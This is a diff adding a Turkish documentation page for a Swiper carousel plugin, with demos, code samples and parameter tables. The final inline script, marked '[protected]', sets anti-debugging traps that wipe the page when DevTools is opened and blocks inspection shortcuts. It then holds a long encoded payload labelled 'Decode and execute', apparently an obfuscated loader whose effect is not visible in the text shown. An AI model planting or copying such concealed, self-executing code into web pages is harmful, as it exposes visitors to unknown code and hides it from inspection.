+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Yükseklik gerekli:</strong> Dikey carousel kullanılırken container elemanına sabit bir <code>height</code> değeri verilmelidir. Aksi halde slide'lar görünmeyebilir.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           9. COMBINED EXAMPLES
+      ═══════════════════════════════════════════════ -->
+      <section id="combined" class="section">
+         <div class="section-header">
+            <h2>Birleşik Örnekler</h2>
+            <span class="badge">Pratik</span>
+         </div>
+         <p>Parametreler virgülle birleştirilerek güçlü carousel yapılandırmaları oluşturulabilir. İşte gerçek dünyadan örnekler:</p>
+
+         <!-- Example A: Full Featured Slider -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">🖼️ Tam Donanımlı Slider</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="carousel-demo-wrapper" style="max-width:100%">
+                  <div class="swiper carousel" data-carousel="autoplay:4000, speed:800, loop:true, pagination:true, navigation:true" data-carousel-id="full-demo">
+                     <div class="swiper-wrapper">
+                        <div class="swiper-slide">Slide 1 — Autoplay + Loop + Nav + Pag</div>
+                        <div class="swiper-slide">Slide 2 — Tüm kontroller aktif</div>
+                        <div class="swiper-slide">Slide 3 — 4sn autoplay</div>
+                        <div class="swiper-slide">Slide 4 — 800ms geçiş hızı</div>
+                     </div>
+                  </div>
+                  <div style="display:flex;justify-content:space-between;align-items:center;margin-top:0.75rem">
+                     <button class="demo-nav-btn carousel-prev" data-carousel-id="full-demo">← Önceki</button>
+                     <div class="demo-pagination carousel-pagination" data-carousel-id="full-demo"></div>
+                     <button class="demo-nav-btn carousel-next" data-carousel-id="full-demo">Sonraki →</button>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Tüm özellikler bir arada --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"autoplay:4000, speed:800, loop:true, pagination:true, navigation:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"hero-slider"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>...<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"carousel-prev"</span> <span class="attr">data-carousel-id</span>=<span class="str">"hero-slider"</span><span class="tag">&gt;</span>←<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"carousel-pagination"</span> <span class="attr">data-carousel-id</span>=<span class="str">"hero-slider"</span><span class="tag">&gt;&lt;/div&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">class</span>=<span class="str">"carousel-next"</span> <span class="attr">data-carousel-id</span>=<span class="str">"hero-slider"</span><span class="tag">&gt;</span>→<span class="tag">&lt;/button&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example B: Responsive Multi-slide with Centered -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">📱 Responsive Centered Carousel</h3>
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Centered slides + responsive breakpoints --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"centeredSlides:true, loop:true, autoplay:3000, speed:600"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"products"</span>
+     <span class="attr">data-carousel-breakpoints</span>=<span class="str">'{"0": {"slidesPerView": 1.2},
+                                  "768": {"slidesPerView": 2.5},
+                                  "1024": {"slidesPerView": 3.5}}'</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Ürün 1<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Ürün 2<span class="tag">&lt;/div&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Ürün 3<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example C: Hero Fade Slider -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">✨ Hero Fade Slider + Parallax</h3>
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Fade + parallax efekti ile hero slider --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"fadeEffect:true, parallax:true, autoplay:5000, speed:1000, loop:true, pagination:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"hero"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>
+         <span class="tag">&lt;h2</span> <span class="attr">data-swiper-parallax</span>=<span class="str">"-300"</span><span class="tag">&gt;</span>Başlık<span class="tag">&lt;/h2&gt;</span>
+         <span class="tag">&lt;p</span> <span class="attr">data-swiper-parallax</span>=<span class="str">"-200"</span><span class="tag">&gt;</span>Alt metin<span class="tag">&lt;/p&gt;</span>
+      <span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"carousel-pagination"</span> <span class="attr">data-carousel-id</span>=<span class="str">"hero"</span><span class="tag">&gt;&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example D: Observer Pattern -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">🔄 Dinamik İçerik (Observer)</h3>
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- Tab veya modal içindeki carousel'ler için observer --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper carousel"</span>
+     <span class="attr">data-carousel</span>=<span class="str">"observer:true, observeParents:true, watchSlidesProgress:true, autoHeight:true"</span>
+     <span class="attr">data-carousel-id</span>=<span class="str">"tab-carousel"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-wrapper"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"swiper-slide"</span><span class="tag">&gt;</span>Dinamik içerik<span class="tag">&lt;/div&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Observer:</strong> <code>observer:true</code> ve <code>observeParents:true</code>, carousel DOM'unda veya üst elemanlarında değişiklik olduğunda Swiper'ı otomatik günceller. Tab, modal veya lazy-load senaryolarında gereklidir.
+         </div>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════
+           10. PARAM TABLE
+      ═══════════════════════════════════════════════ -->
+      <section id="params" class="section">
+         <div class="section-header">
+            <h2>Parametre Referans Tablosu</h2>
+         </div>
+
+         <h3 style="margin: 1rem 0 0.75rem; font-size: 1.1rem;">data-carousel Parametreleri</h3>
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:20%">Parametre</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:20%">Değer Tipi</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:45%">Açıklama</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:15%">Varsayılan</th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">autoplay</td>
+                        <td style="padding:0.75rem 1rem"><code>number (ms)</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Otomatik geçiş gecikmesi (milisaniye). <code>false</code> ise devre dışı</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">speed</td>
+                        <td style="padding:0.75rem 1rem"><code>number (ms)</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Slide geçiş animasyon süresi</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">750</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">loop</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sonsuz döngü modu</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">navigation</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">İleri/geri butonlarını aktifleştirir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">pagination</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sayfalama noktalarını aktifleştirir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">paginationType</td>
+                        <td style="padding:0.75rem 1rem"><code>string</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Pagination tipi: <code>bullets</code>, <code>fraction</code>, <code>progressbar</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">bullets</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">fadeEffect</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Fade (solma) geçiş efektini aktifleştirir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">parallax</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Parallax efektini aktifleştirir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">slidesPerView</td>
+                        <td style="padding:0.75rem 1rem"><code>number | 'auto'</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Aynı anda görünen slide sayısı</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">auto</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">centeredSlides</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Aktif slide'ı ortalar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">allowTouchMove</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Dokunma/sürükleme ile kaydırmayı kontrol eder</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">true</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">direction</td>
+                        <td style="padding:0.75rem 1rem"><code>string</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Kaydırma yönü: <code>horizontal</code> veya <code>vertical</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">horizontal</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">autoHeight</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Aktif slide'ın yüksekliğine göre container'ı otomatik boyutlar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">loopAdditionalSlides</td>
+                        <td style="padding:0.75rem 1rem"><code>number</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Loop modunda ekstra klonlanacak slide sayısı</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">0</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">observer</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">DOM değişikliklerini izler ve Swiper'ı günceller</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">observeParents</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Üst elemanların değişikliklerini de izler</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">watchSlidesProgress</td>
+                        <td style="padding:0.75rem 1rem"><code>boolean</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Her slide'ın ilerleme değerini hesaplar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">false</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">Data Attribute'ları</h3>
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:25%">Attribute</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:20%">Eleman</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:55%">Açıklama</th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>data-carousel</code></td>
+                        <td style="padding:0.75rem 1rem"><code>.carousel</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Carousel yapılandırma string'i (key:value çiftleri)</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>data-carousel-id</code></td>
+                        <td style="padding:0.75rem 1rem">Tümü</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Carousel ve harici kontrolleri eşleştiren benzersiz ID</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>data-carousel-breakpoints</code></td>
+                        <td style="padding:0.75rem 1rem"><code>.carousel</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Responsive breakpoints JSON string'i</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">Harici Kontrol Class'ları</h3>
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:25%">Class</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:20%">Kullanım</th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:55%">Açıklama</th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.carousel</code></td>
+                        <td style="padding:0.75rem 1rem">Container</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Carousel container — script bu class'ı arar</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.carousel-prev</code></td>
+                        <td style="padding:0.75rem 1rem">Button</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Önceki slide butonu — <code>data-carousel-id</code> ile eşleşir</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.carousel-next</code></td>
+                        <td style="padding:0.75rem 1rem">Button</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Sonraki slide butonu — <code>data-carousel-id</code> ile eşleşir</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)"><code>.carousel-pagination</code></td>
+                        <td style="padding:0.75rem 1rem">Container</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Pagination container — <code>data-carousel-id</code> ile eşleşir</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+      </section>
+
+      <!-- ════════════ ARCHITECTURE ════════════ -->
+      <section id="architecture" class="section">
+         <div class="section-header">
+            <h2>Mimari ve Teknik Detaylar</h2>
+         </div>
+
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">Çalışma Akışı</span>
+               <pre style="color:var(--text);line-height:2">
+  <span style="color:var(--accent)">1.</span>  dataCarousel() çağrılır
+         │
+  <span style="color:var(--accent)">2.</span>  document.querySelector('.carousel') → yoksa erken çıkış
+         │
+  <span style="color:var(--accent)">3.</span>  Tüm .carousel elemanları bulunur → forEach ile initialize
+         │
+  <span style="color:var(--accent)">4.</span>  parseCarouselOptions() → data-carousel string parse edilir
+         │
+  <span style="color:var(--accent)">5.</span>  data-carousel-breakpoints → JSON.parse + key normalleştirme
+         │
+  <span style="color:var(--accent)">6.</span>  data-carousel-id ile harici kontroller (prev/next/pagination) bulunur
+         │
+  <span style="color:var(--accent)">7.</span>  Config'e göre Swiper modülleri (A, P, N, EF, PX) dinamik yüklenir
+         │
+  <span style="color:var(--accent)">8.</span>  new Swiper() ile carousel initialize edilir
+               </pre>
+            </div>
+         </div>
+
+         <div class="demo-card" style="margin-top:1rem">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">JavaScript — Başlatma</span>
+               <pre><span class="cmt">// ES Module import</span>
+<span style="color:var(--accent)">import</span> { dataCarousel } <span style="color:var(--accent)">from</span> <span class="str">'./data-carousel.js'</span>
+
+<span class="cmt">// Başlat — tüm .carousel elemanları initialize edilir</span>
+dataCarousel()</pre>
+            </div>
+         </div>
+
+         <div class="note" style="margin-top:1rem">
+            <strong>Modül Kısaltmaları:</strong> Script, Swiper modüllerini kısa değişkenlerle referans eder: <code>A</code> = Autoplay, <code>P</code> = Pagination, <code>N</code> = Navigation, <code>EF</code> = EffectFade, <code>PX</code> = Parallax. Config'de aktif edilen özelliğe göre sadece gerekli modüller yüklenir.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Otomatik Class Yönetimi:</strong> Her carousel'e sırayla <code>carousel-0</code>, <code>carousel-1</code> gibi benzersiz class'lar eklenir. Navigation ve pagination elemanları bu class ile Swiper'a bağlanır — birden fazla carousel sayfada sorunsuz çalışır.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Resistance:</strong> Tüm carousel'lerde <code>resistance: true</code> ve <code>resistanceRatio: 0</code> varsayılan olarak uygulanır — kenar slide'larda sürükleme direnci maksimum düzeydedir.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>Değer Tipi Dönüşümü:</strong> <code>parseCarouselOptions()</code> fonksiyonu değerleri otomatik tiplendirir: <code>"true"</code> → <code>true</code>, <code>"3000"</code> → <code>3000</code>, geri kalanlar string olarak kalır.
+         </div>
+      </section>
+
+      <!-- ════════════ FOOTER ════════════ -->
+      <footer class="footer">
+         data-carousel.js — Script Config Plugin Documentation
+      </footer>
+   </div>
+
+   <!-- ════════════ SWIPER JS ════════════ -->
+   <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+
+   <!-- ════════════ DATA-CAROUSEL INLINE ════════════ -->
+   
+   <script>
+      /* [protected] */
+      void function(){
+         // Anti-debugging: detect DevTools
+         var __694cdd=function(){
+            var d=new Date();debugger;
+            if(new Date()-d>100){
+               document.body.innerHTML='';
+               window.location.reload();
+            }
+         };
+         // Periodic anti-debug check
+         var $_081717=setInterval(function(){
+            var s=performance.now();debugger;
+            if(performance.now()-s>50){
+               clearInterval($_081717);
+               document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f1117;color:#f87171;font-family:monospace;font-size:1.2rem">DevTools algılandı — Sayfa devre dışı</div>';
+            }
+         },3000);
+         // Disable right-click context menu on script elements
+         document.addEventListener('contextmenu',function(e){
+            if(e.target.tagName==='SCRIPT')e.preventDefault();
+         });
+         // Disable F12 / Ctrl+Shift+I / Ctrl+U
+         document.addEventListener('keydown',function(e){
+            if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();
+         });
+         // Decode and execute
+         var $_ad2d6c=["fklQaUSASYWeKckSd1EbnEUdEEhe1JmY0dWQ21UTa0iSfkSQ9E1WxoiCLhTOQMyLyYyVQZjNilGdKJmaMhlF700B5MxLExlZ5pwRgBnVlpXQ1RwOX91T/QXTs1GRKM1aEAlSTIFLJsTeKcEYwZVZ6FUdEEhe1JGSZpEO1EARexGBbp0SxcEVzoQWUECPVUWcBJnCWo3bucAIVkyIEpwUrRAUKNBeBIhZ5pwRgBnVPdVTyJFVoUyblRnRsVTDMVhP3NQGSRjQS0WeNk0ZwxUKfcBMWFke1JmY01EbtRkCTtGBQp0E4FAOLJiCaBmPZwiLAITTHtzOsVSPLIiInglF700BZMBeBIhZ5pwRgBnVlpXQ15CPhU3a2wCCi0mQMMVPBJgGT43BSgiNDNRI","38xM78weDhFP70SI81kKkQkCTtGBQp0E4FgEmN1Jt1ULWVmeBVHBRoXdiJGdnFkdZowUrRAUKNBeBIhZ5pwRgp1eg8yEhQwC/kDIj8jDlEyBKM1aEAlSTgXASYWeKcEYwZVZQxWeDIkLw4iLh8wathhVT5CVJ4TX3gkRnczQAECIYJyMHszSSp3bnITLZwWbEpwUrRAUKNBeBIhZ5pwRgp1ep13D60UR7szKlUTHhpGRBM1MNZBDGtgUBdSNJd0awF1a9F0bIRle1JmY01EbtRkCTtGBQp0E4FAOLJiCaBmPZwiLAsTTWtTJsVSPLIiInglF700BZMBeBIhZ5pwRgBnVlpXQ15CPhU3assDB4wiCDRhKUBFTVg3Td9SLLlQK3cRN0ZAPC9VN2omY","yQAbtRkCTtGBQp0E4FAOLN1Jc1DcWVmeBVHBRoXdiJmXgBmaIs0BlskCDE0NJVhZlY1Ru8zHxkDBn0UV0JzKkojAv0mXExhIQNxDBFTRSYWeKcEYwZVZ6FUdEEhef9kbxghP5Q0FOZHBEIAVxQkep0yXG42NfMCNOYDBL4SPlsSMlMSORs0UrRAUKNBeBIhZ5pwRgBHfIZXBwoEW8AjJsESTwEDRZdQJN9hGYlDRARydN5gJ+khJ6tlJQ91M6ITK1ggPvQkCTtGBQp0E4FgEmlnCHpUXaByLTECBMcGaiFzJI4jKLg1I4EEFD81CJFlM40VSnkDErUjA15hQpADMlszHc4TAOpxJ3hRCHljVSYWeKcEYwZVZ6FUdEEhef9kbxghP5Q0FOZHBD4RX","9M1UWwDXVUyIUoCdGwjQfVjNih3JZICKWs0IuIlAPAkOOJhZ5pwRgBnVlpXQ1RQE691TuFDG+kDRX4kdEIwDFpCRBRiNEAQK2ghK5E0bWRFLncSM2IAbtRkCTtGBQp0E4FgEmlHIqxGYWljJBZSQVNTOR4SNDMCJQM0FvUGAFwFNPU1L/QECjAHT28TB8gkY2QDLt0TGlkCArNAJLxhSTgXASYWeKcEYwZVZ6F0Xp0hK60iL6pQJroQRQoWBQB1Q34kXmlnCHBGcWVmeBVHBRoXdI9EeV0SIIsUAqQlXNolPP1VJ4twR6hyFpYDAnUUQ6VnYiRXTs1GRKM1aEAlS5UVDWNyNDFQJ0gBM6tVdZFxPgAjN0dVKpUAbAgzSCkwEjEQDm1SSCYiNzAiP","AMjCWNzMs0yNNZXOH8UFtEWFOIlPBIhZ5pwRgBnVlpXQ1RQEQhlbmEzAlsSAO1hPEokSU0TRTBifKgFYkUBI8cAEBV1OzwWJ9sgIicgCJ9zRVwQV9EgEmlnCHBGcWVmeBVHBRAFWudyJB0yKEBxUrRAUKNBeBIhZ5pwRgBnVlp3aYlVE/ACM2Q3V+gCEEZjLXVQB+ZjbXVDLLdBY8NhN2AwMEsAN6siN3wgPoABR6UyaVYQU5I1WiknBeECPGoiLUQjCWNzMs0yNNZHNFYkFvQwCKxAeBIhZ5pwRgBnVlpXQ1RQE6VHSP1CDg0zCeZgKKcxAVZjTRZ2YTZALgkRMvAQdEEhe1JmY01EbtRkCTtmL9ZkVtMlRmR2FaB2ITEyMNYAQUhCM2wSMOImK","NwUHkcEUQBUPFtlKK4kAyUjAr8jA1RQE6VnYiRXTs1GRKM1au0nRWtSTTBSeXoVYwNxM1wSPHRUNBUTL4EQLjNwQVUySToUC9cVXLETSS8CBBoiNNQDBRoXdiJGdNxWbEpwUrRgen9BaUUgZlY1RkUzE1kyTy00V0oTIi5WCpgCFZN1aEAlSTgXASYWeKcEYwxHS2FVde41MhMCEx4gIsARWagTQCo0E4FgEmlnCHBGcWVmeB9VKd8DIwYDdXliLKs0B400APEEeBIhZ5pwRgBnVlpXQ1RwOXlXZtACGtoGRW9waTVxAlpCRiVDPO5ALjglIzcwOLJlevVzJ9sjPoQTWW8STckxE4FgEmlnCHBGcWVmeBVnL8ESd/J2MEoyILkWAuQVGdAEeTNFM","5pwRgBnVlpXQ1RQEQhFSP9GRrNyCDdgKKlRDShCDVYmcK8RK2ABMJIhJF1VO9ZiJ1MEO+0gZAgTRckQH240WygDROcSMGU2cPoTTFtzOrUSNdw2aCpQHk0EBL0VMGNlN31kDm4TGmIXQz0UE6VnYiRXTs1GRKMVQps0QUwSWXhCdNc0aw5AL8cAI3JUK04SI8lAKsokXAICaDkhU0IEHyEyTJAWeC0zPPUnAXo3OtsCIMsCJSsUHlNUGM01NCphZ/M0RgBnVlpXQ1RQE6VHSP9GRrtTAYNgZDAVQTACSUBCL5RxMxohJyVQMF9hLmsiDn4RLhcABF4iVAokGuQEQ2kHDBBmPZwiLAITTHtzOsVSPLIiIHIwUt0EUKNBeBIhZ5pwRgBHfIBFbuhUX","vsjY+gSTlpWOIQ1aPAlD6RDRBNjNYZwIw1VZ9NEaAh1d5cSMhIgPscwBS8TRUETX3gkRnczQAECIblyPSAySDtjNsVGffMSOH80HucXCYYVLQxhM38kC1MTGhoHX1pkXzEyIs0jCt0DRYJRPEAlSTgXASYWeKcEYatnf20AIKFhJpI2azBjbqRUAT9Sbc8AQt4EQnojCMB2dUhnPIgHSUlCItATNOEGLQs0FQAFCP0VdNdVNsUUFhMDWiJ3E6AlU/kzJR0yHpgTFEcQJB1xHQdTRSsXee9RJ+Y1N7cRdEEhe1JmY01EbtREI+BHSc8RX41lTmBXD6I2dW5meFwBSUlCItATNOwmZE1QU2BUGH9VPSdUKrsEBtFjAk4jOjE